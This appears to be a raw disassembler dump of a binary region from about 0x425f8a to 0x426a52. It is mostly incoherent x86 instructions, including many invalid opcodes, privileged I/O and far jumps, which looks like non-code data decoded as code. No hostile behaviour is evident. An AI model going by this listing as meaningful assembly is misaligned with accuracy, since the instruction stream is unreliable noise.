  425f8a:	xlat   BYTE PTR ds:[ebx]
  425f8b:	mov    al,0x74
  425f8d:	mov    ebp,0x8c564404
  425f92:	or     bl,BYTE PTR [esi]
  425f94:	add    DWORD PTR [ecx],eax
  425f96:	add    BYTE PTR [eax+0x31961554],bh
  425f9c:	iret   
  425f9d:	stos   DWORD PTR es:[edi],eax
  425f9e:	inc    ebp
  425f9f:	into   
  425fa0:	pop    es
  425fa1:	pop    es
  425fa2:	or     BYTE PTR [esi],cl
  425fa4:	jmp    0x425f85
  425fa6:	in     al,dx
  425fa7:	stc    
  425fa8:	fadd   DWORD PTR [ebx-0x30]
  425fab:	fist   WORD PTR [ecx-0x7]
  425fae:	(bad)  
  425fb0:	cmp    bl,BYTE PTR [ecx-0x1b6dee7a]
  425fb6:	popf   
  425fb7:	dec    ebx
  425fb8:	adc    al,BYTE PTR [edx+0x47]
  425fbb:	in     al,0xef
  425fbd:	fist   WORD PTR [ebx+esi*2-0x46]
  425fc1:	mov    ds:0xb9f033fc,al
  425fc6:	adc    edi,DWORD PTR [ebx-0x17]
  425fc9:	ins    BYTE PTR es:[edi],dx
  425fca:	xchg   ebx,eax
  425fcb:	sahf   
  425fcc:	shld   DWORD PTR [ebp-0x48186130],edx,0xa1
  425fd4:	add    al,BYTE PTR [ecx+0x204ed4b9]
  425fda:	add    DWORD PTR [ebp+0x2ee73e5e],ecx
  425fe0:	or     BYTE PTR ss:[ebx-0x4815512],ch
  425fe7:	icebp  
  425fe8:	mov    ebp,?
  425fea:	inc    ebp
  425feb:	mov    ebp,0x37bb6917
  425ff0:	gs std 
  425ff2:	ins    BYTE PTR es:[edi],dx
  425ff3:	mov    eax,ds:0x9792be82
  425ff8:	sti    
  425ff9:	test   eax,0xc374ef87
  425ffe:	pop    ebp
  425fff:	bound  edi,QWORD PTR [edi-0x25]
  426002:	in     eax,0xf5
  426004:	xor    ah,0xa7
  426007:	jb     0x425fd0
  426009:	repz push 0x70
  42600c:	fcomp  DWORD PTR [ebx+0x43]
  42600f:	add    DWORD PTR [edi+0x18d4422],esp
  426015:	dec    ebx
  426016:	and    al,0xb2
  426018:	push   0x4e6e7507
  42601d:	icebp  
  42601e:	ss sub eax,0xc74c72ec
  426024:	sbb    dh,0xfb
  426027:	enter  0x2759,0xf6
  42602b:	mov    bl,0x60
  42602d:	xor    ah,BYTE PTR [edx]
  42602f:	dec    ecx
  426030:	add    dl,BYTE PTR [esi-0x6b2b86f0]
  426036:	fistp  QWORD PTR [ecx]
  426038:	shl    BYTE PTR [ebx+0x6f7e2e48],cl
  42603e:	inc    ebx
  42603f:	stos   BYTE PTR es:[edi],al
  426040:	cmp    BYTE PTR [ebx+0x10fd4cb3],0x7a
  426047:	popa   
  426048:	mov    ebp,0xc4b0f676
  42604d:	fnsave [si-0x1b9]
  426052:	sub    edx,ecx
  426054:	sub    eax,0x2389684a
  426059:	pop    eax
  42605a:	ret    
  42605b:	mov    ah,bh
  42605d:	xchg   BYTE PTR [ebp-0x41a8cf10],cl
  426063:	pop    esp
  426064:	mov    esi,0x91afa579
  426069:	lahf   
  42606a:	retf   
  42606b:	mov    bh,0x71
  42606d:	into   
	...
  4260d6:	cmp    DWORD PTR [eax-0x6854f9f5],ebx
  4260dc:	cmp    eax,0x304575bf
  4260e1:	in     al,dx
  4260e2:	aas    
  4260e3:	es in  al,0x68
  4260e6:	addr16 cwde 
  4260e8:	add    DWORD PTR [eax],eax
  4260ea:	add    BYTE PTR [ecx],al
  4260ec:	add    BYTE PTR [eax],al
  4260ee:	aas    
  4260ef:	pusha  
  4260f0:	add    eax,0x867684cd
  4260f5:	rol    DWORD PTR [ebx+0x7e],cl
  4260f8:	or     DWORD PTR [edx-0x1fdd98d],edi
  4260fe:	push   0x6f6896a7
  426103:	test   eax,0x7ecb354e
  426108:	ins    DWORD PTR es:[edi],dx
  426109:	adc    eax,0x71e89935
  42610e:	mov    ?,WORD PTR [esi+0x3d]
  426111:	repnz fimul WORD PTR [esi+edi*1]
  426115:	aam    0x75
  426117:	jne    0x42612c
  426119:	xor    al,0x71
  42611b:	jns    0x42611a
  42611d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42611e:	scas   al,BYTE PTR es:[edi]
  42611f:	pop    ebp
  426120:	add    bh,bl
  426122:	(bad)  
  426123:	shl    bl,cl
  426125:	pop    ebx
  426126:	dec    ebx
  426127:	mov    dh,0xf9
  426129:	jno    0x426194
  42612b:	repnz mov dl,0x9a
  42612e:	pop    ds
  42612f:	ret    0xd5f7
  426132:	inc    ebx
  426133:	jmp    0x37a5:0xb0071803
  42613a:	dec    ebp
  42613b:	mov    al,ds:0x80a714e7
  426140:	ror    DWORD PTR [edi],0x16
  426143:	imul   di
  426146:	sub    eax,0xf0fd7f2c
  42614b:	jo     0x4261ac
  42614d:	stos   DWORD PTR es:[edi],eax
  42614e:	mov    esi,0x1150e5a4
  426153:	sahf   
  426154:	cmp    al,0x46
  426156:	adc    eax,0x834f6aaf
  42615b:	xor    ebx,DWORD PTR [edx]
  42615d:	fwait
  42615e:	dec    ecx
  42615f:	cmp    dl,al
  426161:	mov    dl,0xcc
  426163:	lods   al,BYTE PTR ds:[esi]
  426164:	xchg   esi,eax
  426165:	sub    BYTE PTR [edi],bh
  426167:	inc    edi
  426168:	or     DWORD PTR [edi+0x36],esp
  42616b:	push   0xffffffc1
  42616d:	sahf   
  42616e:	xchg   edi,eax
  42616f:	or     eax,DWORD PTR [edx+0x1ac11255]
  426175:	jne    0x4261aa
  426177:	shr    BYTE PTR [esi],1
  426179:	out    dx,eax
  42617a:	mov    es:0x972a3a1d,eax
  426180:	sbb    eax,0xd1561e36
  426185:	cdq    
  426186:	adc    eax,0x756186cf
  42618b:	push   esp
  42618c:	adc    eax,0xace9d3a4
  426191:	push   0xffffffc9
  426193:	scas   al,BYTE PTR es:[edi]
  426194:	pop    ebp
  426195:	add    dh,ch
  426197:	mov    WORD PTR [ebx+0x1fb98df0],?
  42619d:	ins    BYTE PTR es:[edi],dx
  42619e:	adc    DWORD PTR [esi+0x24e75215],esp
  4261a4:	inc    esi
  4261a5:	test   BYTE PTR [edi-0xf],bl
  4261a8:	xor    cl,BYTE PTR [edi-0x22d76f97]
  4261ae:	and    dl,BYTE PTR [esi]
  4261b0:	loop   0x4261ee
  4261b2:	mov    ecx,0x4d94be07
  4261b7:	in     al,0xf
  4261b9:	pop    ecx
  4261ba:	lahf   
  4261bb:	(bad)  
  4261bc:	fsub   st(0),st
  4261be:	icebp  
  4261bf:	retf   0x5e04
  4261c2:	repnz lds esp,FWORD PTR [ebp+0xc135997]
  4261c9:	add    DWORD PTR [edx],ecx
  4261cb:	cld    
  4261cc:	add    BYTE PTR [eax+ebp*2],cl
  4261cf:	lods   eax,DWORD PTR ds:[esi]
  4261d0:	push   eax
  4261d1:	enter  0x2f8,0xc3
  4261d5:	push   eax
  4261d6:	cmp    esi,DWORD PTR ds:0x29946a6b
  4261dc:	push   0xf60caced
  4261e1:	xchg   edi,eax
  4261e2:	stc    
  4261e3:	inc    ebp
  4261e4:	add    al,0xc9
  4261e6:	in     al,dx
  4261e7:	retf   0x8d32
  4261ea:	sub    al,0xf
  4261ec:	pop    ebp
  4261ed:	stos   BYTE PTR es:[edi],al
	...
  426256:	fwait
  426257:	and    DWORD PTR [edi],ecx
  426259:	popa   
  42625a:	mov    edi,0xb7fbff6f
  42625f:	xor    DWORD PTR [ecx-0xe85d8d9],0xffffffee
  426266:	addr16 cdq 
  426268:	add    DWORD PTR [eax],eax
  42626a:	add    BYTE PTR [ecx],al
  42626c:	add    BYTE PTR [eax],al
  42626e:	xchg   edx,eax
  42626f:	sbb    DWORD PTR [ebx+ebx*4+0x50c1b574],edx
  426276:	jmp    0x426247
  426278:	cmp    bh,ch
  42627a:	push   ebp
  42627b:	adc    edi,DWORD PTR [ebx]
  42627d:	dec    ebp
  42627e:	mov    al,0x8e
  426280:	fldcw  WORD PTR [ebp+eax*4+0x12]
  426284:	imul   DWORD PTR [ebx+0x7a35efcd]
  42628a:	push   edx
  42628b:	add    esp,edx
  42628d:	jmp    0x8371:0x2e8f3f6e
  426294:	in     al,0x8b
  426296:	jns    0x4262dc
  426298:	jp     0x4262c4
  42629a:	lock ds das 
  42629d:	dec    edi
  42629e:	push   ebx
  42629f:	rcr    ebp,cl
  4262a1:	dec    ecx
  4262a2:	jge    0x426238
  4262a4:	div    BYTE PTR [ecx-0x76]
  4262a7:	lods   eax,DWORD PTR ds:[esi]
  4262a8:	mov    eax,0xfa077bc1
  4262ad:	or     edx,ebp
  4262af:	fwait
  4262b0:	or     al,BYTE PTR [ebx-0x4279d117]
  4262b6:	sar    DWORD PTR [esi+ecx*1-0xe],0x46
  4262bb:	gs xchg ecx,eax
  4262bd:	jl     0x4262a0
  4262bf:	aaa    
  4262c0:	mov    esi,?
  4262c2:	xchg   edi,eax
  4262c3:	jecxz  0x4262aa
  4262c5:	dec    edx
  4262c6:	fldenv [edx]
  4262c8:	push   ebp
  4262c9:	(bad)  
  4262ca:	loop   0x42626e
  4262cc:	js     0x426268
  4262ce:	sbb    BYTE PTR [esi],cl
  4262d0:	fwait
  4262d1:	xor    eax,0x5243150b
  4262d6:	mov    al,0xa1
  4262d8:	outs   dx,BYTE PTR ds:[esi]
  4262d9:	push   es
  4262da:	xchg   edi,eax
  4262db:	lock js 0x4262c2
  4262de:	push   eax
  4262df:	imul   ebx,DWORD PTR ds:0x784e67c0,0xffffffd8
  4262e6:	shr    BYTE PTR [ebx],1
  4262e8:	and    edx,DWORD PTR [di]
  4262eb:	sub    BYTE PTR [edi-0x29],dh
  4262ee:	jmp    0x1a0c:0xaa7ec861
  4262f5:	push   edi
  4262f6:	or     BYTE PTR [esi],dl
  4262f8:	shl    ebx,0xd7
  4262fb:	(bad)  
  4262fc:	sub    al,0xc7
  4262fe:	and    eax,DWORD PTR [ebp-0x50]
  426301:	imul   esp,DWORD PTR [ebp-0x2],0x31721c84
  426308:	inc    ecx
  426309:	adc    esi,DWORD PTR [edx+0x4b9a7ce6]
  42630f:	(bad)  
  426310:	cmp    eax,0x7c904746
  426315:	or     eax,0xab1b32e8
  42631a:	xor    DWORD PTR [edx+0xe],esi
  42631d:	lea    edi,[eax+0x37c6e03f]
  426323:	xor    esp,DWORD PTR [edi]
  426325:	test   al,0xc9
  426327:	bound  edx,QWORD PTR [edx+0x3716cf9]
  42632d:	or     DWORD PTR [ebx+0x41],ebx
  426330:	mov    al,0x1d
  426332:	cmovbe eax,DWORD PTR [edi+0x3e]
  426336:	adc    eax,0x73689c78
  42633b:	mov    al,bl
  42633d:	scas   al,BYTE PTR es:[edi]
  42633e:	mov    esi,0x3c31333b
  426343:	mul    dl
  426345:	xor    al,0xb4
  426347:	dec    edx
  426348:	dec    eax
  426349:	mov    edx,0x2c7c7903
  42634e:	ficomp WORD PTR [edx-0x57]
  426351:	pop    ss
  426352:	mov    al,BYTE PTR [ecx-0x327c0fb8]
  426358:	mov    ds:0xadb5ebe8,al
  42635d:	push   ds
  42635e:	iret   
  42635f:	int    0xe2
  426361:	mov    dl,0x26
  426363:	jl     0x42634e
  426365:	push   eax
  426366:	sar    BYTE PTR [ebx],1
  426368:	mov    bl,0x5b
  42636a:	sub    ecx,eax
  42636c:	inc    ebp
  42636d:	xlat   BYTE PTR ds:[ebx]
	...
  4263d6:	push   esp
  4263d7:	and    eax,0xeefd4e8d
  4263dc:	xlat   BYTE PTR ds:[ebx]
  4263dd:	aas    
  4263de:	dec    ecx
  4263df:	sbb    esi,edi
  4263e1:	or     eax,0xd0b81c19
  4263e6:	addr16 call 0x0:0x1000001
  4263ee:	xor    al,0x4e
  4263f0:	je     0x42641e
  4263f2:	rol    BYTE PTR [esp+edi*2+0x7427dc9c],0xdd
  4263fa:	push   ds
  4263fb:	lods   eax,DWORD PTR ds:[esi]
  4263fc:	sub    DWORD PTR [esi],ecx
  4263fe:	mov    bh,0xc3
  426400:	rcr    DWORD PTR [ebp+0x306409be],1
  426406:	ins    DWORD PTR es:[edi],dx
  426407:	jns    0x4263fc
  426409:	push   ss
  42640a:	and    DWORD PTR [edi+0x58],esp
  42640d:	int3   
  42640e:	ins    BYTE PTR es:[edi],dx
  42640f:	mov    esp,esp
  426411:	adc    edi,DWORD PTR [edi]
  426413:	jnp    0x42639e
  426415:	lea    ebp,[edi-0x17]
  426418:	ins    DWORD PTR es:[edi],dx
  426419:	sti    
  42641a:	fcomp  st(5)
  42641c:	mov    BYTE PTR [ecx+0x12cf2223],dl
  426422:	rcr    ch,cl
  426424:	rcl    DWORD PTR [edi+0x559dd73],1
  42642a:	adc    esi,DWORD PTR [ecx]
  42642c:	push   ss
  42642d:	retf   0x57e3
  426430:	mov    eax,0xc169b87f
  426435:	jno    0x4263da
  426437:	es in  al,0x62
  42643a:	and    bh,BYTE PTR [ebp-0x65]
  42643d:	add    al,0xff
  42643f:	stos   BYTE PTR es:[edi],al
  426440:	push   ebp
  426441:	mov    DWORD PTR [edi+0x683986c6],edx
  426447:	xchg   esp,eax
  426448:	inc    ecx
  426449:	jne    0x4264c0
  42644b:	xchg   DWORD PTR [ebx+ebx*8+0x4d],ebx
  42644f:	fld    QWORD PTR [eax]
  426451:	adc    eax,0x87a3a53
  426456:	fcomp  st(2)
  426458:	icebp  
  426459:	pop    esi
  42645a:	add    eax,0x37f0fb49
  42645f:	jno    0x426407
  426461:	mov    bl,BYTE PTR ds:0x21975846
  426467:	pop    ebx
  426468:	or     edx,DWORD PTR [ebp+0x52c94b99]
  42646e:	push   edx
  42646f:	dec    edi
  426470:	ret    0x1f51
  426473:	fnstenv [edx]
  426475:	xchg   dl,cl
  426477:	in     eax,0x2b
  426479:	shl    WORD PTR [ecx-0x81bbce9],0x81
  426481:	and    eax,ecx
  426483:	cmp    ch,BYTE PTR [ecx-0x23]
  426486:	jle    0x426474
  426488:	cmp    DWORD PTR [ecx+0x494617d6],ebx
  42648e:	xchg   ebx,eax
  42648f:	loope  0x4264f2
  426491:	in     eax,0xa2
  426493:	lahf   
  426494:	xchg   esi,eax
  426495:	sbb    al,0xe0
  426497:	(bad)  
  426498:	mov    eax,ds:0x8ea55fa4
  42649d:	mov    al,0x75
  42649f:	adc    edi,DWORD PTR [edx+0x1070886]
  4264a5:	xlat   BYTE PTR ds:[ebx]
  4264a6:	add    eax,0xb030a48a
  4264ab:	(bad)  
  4264ac:	cmp    al,ch
  4264ae:	adc    eax,0xd6a85b63
  4264b3:	sar    BYTE PTR [esi+0x5c],cl
  4264b6:	jmp    0xbe29:0xb744055f
  4264bd:	and    BYTE PTR [ebp+0x70],0xc1
  4264c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4264c2:	loop   0x426468
  4264c4:	repnz lods al,BYTE PTR ds:[esi]
  4264c6:	lods   al,BYTE PTR ds:[esi]
  4264c7:	push   cs
  4264c8:	cmp    edx,DWORD PTR [eax+0x36b44719]
  4264ce:	std    
  4264cf:	mov    BYTE PTR ds:0x9e564136,al
  4264d5:	retf   0x3a62
  4264d8:	(bad)  
  4264d9:	cmc    
  4264da:	pop    ds
  4264db:	add    cl,dh
  4264dd:	out    0xff,eax
  4264df:	pop    es
  4264e0:	and    eax,0xfad0c2a2
  4264e5:	in     al,dx
  4264e6:	jl     0x426517
  4264e8:	gs cdq 
  4264ea:	adc    al,0x56
  4264ec:	cmc    
  4264ed:	fadd   QWORD PTR [eax]
	...
  426553:	add    BYTE PTR [eax],al
  426555:	add    BYTE PTR [ecx+0x6f],ch
  426558:	mov    BYTE PTR [eax],cl
  42655a:	mov    gs,edi
  42655c:	jmp    0x8abb74d0
  426561:	test   DWORD PTR [eax-0x7e],ebp
  426564:	jae    0x42651e
  426566:	addr16 fwait
  426568:	add    DWORD PTR [eax],eax
  42656a:	add    BYTE PTR [ecx],al
  42656c:	add    BYTE PTR [eax],al
  42656e:	hlt    
  42656f:	lea    esi,[edx+0x36893ff]
  426575:	outs   dx,BYTE PTR ds:[esi]
  426576:	lock popa 
  426578:	sbb    BYTE PTR [edx-0xf],bh
  42657b:	stc    
  42657c:	pop    esi
  42657d:	inc    edx
  42657e:	dec    ebp
  42657f:	pushf  
  426580:	jp     0x42657d
  426582:	mov    bl,0x98
  426584:	sub    eax,ecx
  426586:	xchg   ecx,eax
  426587:	jmp    0x61924204
  42658c:	mov    ebp,fs
  42658e:	stc    
  42658f:	arpl   WORD PTR [eax+0x14],dx
  426592:	call   0xfb57:0xf925e6b0
  426599:	call   0xda09b02c
  42659e:	dec    edi
  42659f:	loope  0x42660f
  4265a1:	out    0x83,eax
  4265a3:	adc    al,0x7f
  4265a5:	mov    bh,0xc3
  4265a7:	jmp    0x7d76:0x659210fc
  4265ae:	jb     0x426574
  4265b0:	mov    ds:0x465d777d,eax
  4265b5:	(bad)  
  4265b7:	or     BYTE PTR [ebx],bh
  4265b9:	mov    ebx,0x93b3aaa6
  4265be:	shl    BYTE PTR [ebx-0x33],cl
  4265c1:	test   eax,0xb04868ce
  4265c6:	sahf   
  4265c7:	rol    BYTE PTR [ecx+0x7d1af6e],1
  4265cd:	jmp    0x426629
  4265cf:	inc    edi
  4265d0:	(bad)  
  4265d1:	loop   0x426615
  4265d3:	jo     0x426596
  4265d5:	mov    edi,edi
  4265d7:	or     DWORD PTR [ebp+0x3eeb0cbc],esi
  4265dd:	scas   al,BYTE PTR es:[edi]
  4265de:	aas    
  4265df:	xchg   esi,eax
  4265e0:	(bad)  
  4265e2:	rol    BYTE PTR [esi+0x0],1
  4265e5:	test   al,0x5c
  4265e7:	sbb    eax,0xd325870b
  4265ec:	aam    0xb0
  4265ee:	push   ds
  4265ef:	push   ebx
  4265f0:	jl     0x426593
  4265f2:	dec    edi
  4265f3:	push   eax
  4265f4:	mov    esp,0xc19fe1ac
  4265f9:	mov    ebp,0x4ed4a1f6
  4265fe:	loope  0x426665
  426600:	es jl  0x4265a2
  426603:	test   al,0x6d
  426605:	mov    edi,es
  426607:	jle    0x426655
  426609:	mov    esp,0x2851f0ba
  42660e:	and    al,0x68
  426610:	jle    0x426624
  426612:	fcomp  QWORD PTR [ebx]
  426614:	int    0x4a
  426616:	xor    cl,dl
  426618:	test   BYTE PTR [eax-0x42c12c9],0x83
  42661f:	scas   al,BYTE PTR es:[edi]
  426620:	test   al,0x87
  426622:	pop    ds
  426623:	fcmovb st,st(4)
  426625:	ror    BYTE PTR [ecx-0x4d89677d],0x75
  42662c:	mov    cl,0xfb
  42662e:	and    DWORD PTR [edi-0x73778eec],esp
  426634:	mov    esp,0xfb74b4b4
  426639:	sbb    eax,0x2a48b7ad
  42663e:	fmul   st,st(6)
  426640:	sbb    edi,DWORD PTR [edx]
  426642:	xor    DWORD PTR [esi],edi
  426644:	inc    ebp
  426645:	xor    BYTE PTR [eax],dl
  426647:	call   0x73167de1
  42664c:	call   0x11b8a36b
  426651:	iret   
  426652:	test   ch,cl
  426654:	(bad)  ds:0xf775b910
  42665a:	into   
  42665b:	pusha  
  42665c:	mov    eax,ds:0x6c85acc3
  426661:	push   eax
  426662:	xchg   ebx,esi
  426664:	xchg   edi,eax
  426665:	push   ebp
  426666:	or     BYTE PTR [edx+0x18],al
  426669:	pop    ss
  42666a:	ja     0x4266b2
  42666c:	fstp   TBYTE PTR [esi]
	...
  4266d6:	adc    cl,bl
  4266d8:	sbb    DWORD PTR [edx],0xcb9b5ad9
  4266de:	pop    DWORD PTR [edi-0x674b925c]
  4266e4:	mov    DWORD PTR [edi],esi
  4266e6:	addr16 pushf 
  4266e8:	add    DWORD PTR [eax],eax
  4266ea:	add    BYTE PTR [ecx],al
  4266ec:	add    BYTE PTR [eax],al
  4266ee:	ins    DWORD PTR es:[edi],dx
  4266ef:	mov    ebx,cs
  4266f1:	jb     0x426683
  4266f3:	ror    BYTE PTR [edx+0x2f],1
  4266f6:	mov    ah,0x73
  4266f8:	test   BYTE PTR [edx+eiz*8],bh
  4266fb:	pushf  
  4266fc:	xchg   esi,eax
  4266fd:	(bad)  
  4266fe:	mov    gs,WORD PTR ds:[esi]
  426701:	inc    ebp
  426702:	je     0x4266a7
  426704:	mov    al,BYTE PTR [ecx-0xeef7b4d]
  42670a:	mov    ds:0x388c59cc,eax
  42670f:	sbb    BYTE PTR [ebp-0x3071ba57],al
  426715:	xlat   BYTE PTR ds:[ebx]
  426716:	pusha  
  426717:	and    eax,0xd2231116
  42671c:	jg     0x4266ea
  42671e:	popa   
  42671f:	inc    ebp
  426720:	and    dh,BYTE PTR [edi]
  426722:	xchg   esp,eax
  426723:	test   eax,0x66eccca5
  426728:	jbe    0x42677a
  42672a:	mov    ds:0xe9ea70e7,eax
  42672f:	cmp    al,0x2
  426731:	mov    esp,0xc5bc4da6
  426736:	call   0x8bb25b3a
  42673b:	dec    ebp
  42673c:	stos   DWORD PTR es:[edi],eax
  42673d:	shr    BYTE PTR [edx-0x67f057a8],cl
  426743:	fidiv  DWORD PTR gs:[ecx+edi*8-0x47adec01]
  42674b:	ret    0xe4ba
  42674e:	and    bl,bh
  426750:	xor    DWORD PTR [ebp+0x71d22ce4],eax
  426756:	(bad)  
  426757:	in     al,0x96
  426759:	xlat   BYTE PTR ds:[ebx]
  42675a:	es mov al,0x50
  42675d:	jno    0x42671c
  42675f:	mov    al,0x9
  426761:	into   
  426762:	std    
  426763:	(bad)  
  426764:	fistp  QWORD PTR [ebp-0x1e4237d0]
  42676a:	js     0x426710
  42676c:	std    
  42676d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42676e:	push   ecx
  42676f:	popa   
  426770:	(bad)  
  426771:	fcos   
  426773:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426774:	sub    DWORD PTR [ebx-0x6a],eax
  426777:	mov    ch,0x4b
  426779:	ds pusha 
  42677b:	popa   
  42677c:	sbb    al,BYTE PTR [ebx+0x12]
  42677f:	inc    esp
  426780:	in     al,dx
  426781:	cs icebp 
  426783:	add    ebp,esi
  426785:	mov    al,ds:0x57363d8d
  42678a:	xchg   ebx,eax
  42678b:	dec    edi
  42678c:	pop    eax
  42678d:	in     eax,dx
  42678e:	mov    ebx,0xa363175d
  426793:	sub    DWORD PTR [ebp+0x645bdc90],0xc057fd59
  42679d:	adc    ch,bl
  42679f:	cmp    BYTE PTR [eax-0x69],dl
  4267a2:	sbb    DWORD PTR [ebp-0x7e03a807],ebx
  4267a8:	adc    dh,BYTE PTR [ebp-0x68]
  4267ab:	add    eax,0x4dc9a59f
  4267b0:	inc    ebp
  4267b1:	push   esi
  4267b3:	stos   BYTE PTR es:[edi],al
  4267b4:	sub    cl,dh
  4267b6:	int3   
  4267b7:	aad    0xd1
  4267b9:	push   ebp
  4267ba:	xor    BYTE PTR [eax-0x1e],ah
  4267bd:	push   eax
  4267be:	xor    eax,0x1bddb954
  4267c3:	sahf   
  4267c4:	push   cs
  4267c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4267c6:	stos   DWORD PTR es:[edi],eax
  4267c7:	call   0x2d70:0x67216c99
  4267ce:	jo     0x42676a
  4267d0:	les    ebx,FWORD PTR [edx]
  4267d2:	shl    BYTE PTR [edx+0x53d46566],cl
  4267d8:	cs test ch,0x14
  4267dc:	and    edi,ebp
  4267de:	daa    
  4267df:	fst    DWORD PTR [eax]
  4267e1:	(bad)  
  4267e2:	push   eax
  4267e3:	lods   al,BYTE PTR ds:[esi]
  4267e4:	inc    ebx
  4267e5:	push   ecx
  4267e7:	mov    ds:0x17f85a5a,eax
  4267ec:	inc    esp
  4267ed:	stc    
	...
  426856:	mov    eax,0xff2ace8d
  42685b:	imul   edi,esp,0xffffff9f
  42685e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42685f:	and    dh,0xca
  426862:	dec    esp
  426863:	mov    edx,0x9d676ed7
  426868:	add    DWORD PTR [eax],eax
  42686a:	add    BYTE PTR [ecx],al
  42686c:	add    BYTE PTR [eax],al
  42686e:	xor    esp,eax
  426870:	retf   0x70e2
  426873:	jp     0x42689a
  426875:	mov    ds:0x25ae58f2,eax
  42687a:	stos   BYTE PTR es:[edi],al
  42687b:	xchg   edx,eax
  42687c:	sbb    DWORD PTR [ebp-0x45],esi
  42687f:	push   cs
  426880:	jae    0x426870
  426882:	fcmovb st,st(0)
  426884:	popa   
  426885:	shr    DWORD PTR [ebx],cl
  426887:	pop    ebx
  426888:	(bad)  
  426889:	test   BYTE PTR [ecx+0x4ee78ec1],0x53
  426890:	pushf  
  426891:	jp     0x4268a5
  426893:	mov    bh,BYTE PTR [ebx]
  426895:	xchg   DWORD PTR [edx+0x32],edx
  426898:	push   edx
  426899:	mov    ds:0xcaf1fac2,al
  42689e:	mov    eax,ds:0x7b827eb5
  4268a3:	outs   dx,DWORD PTR ds:[esi]
  4268a4:	shrd   esi,edi,0x82
  4268a8:	sahf   
  4268a9:	mov    edi,0xb8be32a6
  4268ae:	push   esp
  4268af:	mov    edi,0x4fbb824e
  4268b4:	stos   DWORD PTR es:[edi],eax
  4268b5:	adc    eax,0x24c05be1
  4268ba:	inc    edi
  4268bb:	mov    es,ebx
  4268bd:	mov    dh,0xc8
  4268bf:	jle    0x4268d9
  4268c1:	xchg   DWORD PTR [ebx],esp
  4268c3:	in     al,0x2c
  4268c5:	mov    BYTE PTR [ebp-0x78e855f0],cl
  4268cb:	jmp    0xac71:0x5cf56edc
  4268d2:	jb     0x42690a
  4268d4:	push   edi
  4268d5:	retf   
  4268d6:	and    ch,BYTE PTR [ebx]
  4268d8:	test   eax,0x68985098
  4268dd:	std    
  4268de:	ffreep st(5)
  4268e0:	lds    esp,FWORD PTR [ebp-0x60]
  4268e3:	pop    ebx
  4268e4:	rcr    BYTE PTR [edx+0x5a],0x6f
  4268e8:	popa   
  4268e9:	inc    ecx
  4268ea:	xchg   ebp,eax
  4268eb:	xchg   ecx,eax
  4268ec:	mov    ecx,0x4075cf79
  4268f1:	push   ds
  4268f2:	clc    
  4268f3:	dec    ebp
  4268f4:	dec    esi
  4268f5:	test   BYTE PTR [ebx+0x8],bh
  4268f8:	lock (bad) 
  4268fa:	cld    
  4268fb:	int    0x34
  4268fd:	cmp    eax,0x8d14fc88
  426902:	stos   DWORD PTR es:[edi],eax
  426903:	jmp    0xa68b:0xf813cdc5
  42690a:	imul   eax,edi,0xffffffb4
  42690d:	jg     0x4268fc
  42690f:	call   0xd597ae39
  426914:	test   eax,0xaa572ed
  426919:	ja     0x4268a1
  42691b:	mov    bl,0x7d
  42691d:	xchg   ebx,ebx
  42691f:	stc    
  426920:	int3   
  426921:	xchg   edx,eax
  426922:	xchg   ebx,eax
  426923:	mov    bh,0xe0
  426925:	mov    ebp,0xeff307f
  42692a:	dec    edi
  42692b:	mov    edx,0x355d6385
  426930:	adc    al,0x80
  426932:	mov    bh,dh
  426934:	mov    bh,0x21
  426936:	ss call 0x10901c2b
  42693c:	fmulp  st(2),st
  42693e:	(bad)  
  42693f:	jns    0x42698b
  426941:	jge    0x426974
  426943:	sar    DWORD PTR [edx+0x541baf60],1
  426949:	sub    al,0x45
  42694b:	mov    WORD PTR [ebp*2+0x6ac2e9d0],ss
  426952:	in     al,0xb1
  426954:	and    al,0x64
  426956:	mov    edi,DWORD PTR [ecx+0x7e06d647]
  42695c:	mov    ebp,0x28606eb4
  426961:	push   ds
  426962:	pop    esi
  426963:	add    ebx,DWORD PTR [ecx]
  426965:	div    BYTE PTR [ecx+ebx*1]
  426968:	mov    ds:0x2e791c48,al
  42696d:	cmp    BYTE PTR [eax],al
	...
  4269d3:	add    BYTE PTR [eax],al
  4269d5:	add    BYTE PTR [esi+ecx*2+0x7fff7d7d],cl
  4269dc:	mov    edi,?
  4269de:	sub    ebp,esp
  4269e0:	lahf   
  4269e1:	mov    edi,DWORD PTR [edx+0x1f]
  4269e4:	fsubrp st(6),st
  4269e6:	addr16 sahf 
  4269e8:	add    DWORD PTR [eax],eax
  4269ea:	add    BYTE PTR [ecx],al
  4269ec:	add    BYTE PTR [eax],al
  4269ee:	leave  
  4269ef:	cmp    al,0x73
  4269f1:	xchg   edi,eax
  4269f2:	sbb    BYTE PTR [ecx-0x6],cl
  4269f5:	jp     0x426a73
  4269f7:	imul   edx,DWORD PTR [eax],0x58
  4269fa:	icebp  
  4269fb:	out    0xd2,eax
  4269fd:	sub    bh,dh
  4269ff:	mov    ah,0x6a
  426a01:	pop    ebx
  426a02:	cli    
  426a03:	test   al,0xd6
  426a05:	push   edx
  426a06:	leave  
  426a07:	aam    0xf8
  426a09:	std    
  426a0a:	ja     0x426a73
  426a0c:	sub    al,0x11
  426a0e:	pop    edx
  426a0f:	int3   
  426a10:	aas    
  426a11:	sbb    DWORD PTR [eax+eax*2-0x550e79ef],edx
  426a18:	les    ebx,FWORD PTR [eax]
  426a1a:	dec    ebx
  426a1b:	lods   eax,DWORD PTR ds:[esi]
  426a1c:	pop    ss
  426a1d:	sbb    ebp,DWORD PTR [edi+0x42]
  426a20:	mov    dh,0xb3
  426a22:	mov    esi,0xe49561a1
  426a27:	call   FWORD PTR [ebx+ebp*8]
  426a2a:	mov    ebx,0x2df03140
  426a2f:	ss push 0xffffffc4
  426a32:	inc    eax
  426a33:	xchg   ebx,eax
  426a34:	in     al,dx
  426a35:	jae    0x4269e1
  426a37:	loop   0x4269da
  426a39:	test   BYTE PTR [ebx+edi*8],al
  426a3c:	dec    esi
  426a3d:	pop    ebx
  426a3e:	pop    ds
  426a3f:	scas   eax,DWORD PTR es:[edi]
  426a40:	pop    esi
  426a41:	sub    DWORD PTR es:[eax-0x10],edx
  426a45:	mov    edx,0x204a9420
  426a4a:	pusha  
  426a4b:	push   ds
  426a4c:	sbb    eax,0x4bcbaee0
  426a51:	sti    
  426a52:	pop    edx
